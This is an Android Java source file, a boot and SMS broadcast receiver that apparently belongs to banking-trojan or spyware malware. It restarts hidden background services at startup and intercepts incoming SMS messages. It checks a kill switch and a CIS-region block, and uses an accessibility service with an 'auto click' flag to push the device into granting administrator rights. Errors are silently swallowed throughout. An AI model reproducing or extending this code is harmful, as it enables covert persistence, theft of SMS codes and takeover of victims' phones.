package com.example.mmm.Services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;


import com.example.mmm.Main.AccessAdm;
import com.example.mmm.defines;


public class BooterConfig extends BroadcastReceiver {
    defines consts = new defines();
    private String TAG_LOG = BooterConfig.class.getSimpleName()+ consts.strTAG1;
    utils utl = new utils();
    Utitlies idutl = new Utitlies();

    @Override
    public void onReceive(Context context, Intent intent) {

      try {
          if ((!utl.SettingsRead(context, consts.kill).contains(consts.str_dead)) && (!utl.blockCIS(context))) {

              utl.Log(TAG_LOG, consts.str_log1);
              utils.startCustomTimer(context, consts.str_null, 10000);
              for (int i = 0; i < consts.arrayClassService.length; i++) {

                  if ((Build.VERSION.SDK_INT >= 26) && (!idutl.is_dozemode(context))) break;

                  if (!utl.isMyServiceRunning(context, consts.arrayClassService[i])) {

                      if (SensorService.class.getName().equals(consts.arrayClassService[i].getName())) {
                          context.startService(new Intent(context, consts.arrayClassService[i]));
                          utl.Log(TAG_LOG, consts.string_25 + consts.arrayClassService[i]);
                      } else if (Integer.parseInt(utl.SettingsRead(context, consts.str_step2)) >= consts.startStep) {
                          context.startService(new Intent(context, consts.arrayClassService[i]));
                          utl.Log(TAG_LOG, consts.string_26 + consts.arrayClassService[i]);
                      }
                  }else{
                    if(Netmanager.class.getName().equals(consts.arrayClassService[i].getName())){
                          context.stopService(new Intent(context, consts.arrayClassService[i]));
                      }
                      utl.Log(TAG_LOG, consts.string_27_ + consts.arrayClassService[i]);
                  }
              }

              utl.start_dozemode(TAG_LOG, context);
              utl.SettingsWrite(context, consts.statAccessibilty, utl.isAccessibilityServiceEnabled(context, Access.class) ? consts.str_1 : consts.str_step);

              if (intent.getAction().equals(consts.SMS_RECEIVED)) {
                  utl.interceptionSMS(context, intent);
              }


              int schet = 0;
              try {
                  schet = Integer.parseInt(utl.SettingsRead(context, consts.schetBootReceiver));
                  schet++;
                  utl.SettingsWrite(context, consts.schetBootReceiver, consts.str_null + schet);
              } catch (Exception ex) {
              }

                  if (!utl.isAdminDevice(context)) {
                      if(utl.SettingsRead(context, consts.start_admin).contains("1")){
                          if ((utl.getScreenBoolean(context)) && (utl.isAccessibilityServiceEnabled(context, Access.class))) {
                              if (utl.isAccessibilityServiceEnabled(context, Access.class)) {
                                  utl.SettingsWrite(context, consts.autoClick, consts.str_1);//auto click start!
                              }
                              Intent dialogIntent = new Intent(context, AccessAdm.class);
                              dialogIntent.putExtra(consts.string_24, consts.str_1);
                              dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                              dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                              dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                              context.startActivity(dialogIntent);
                          }
                      }
                  }
          }
      }catch (Exception ex){
      }
    }


}
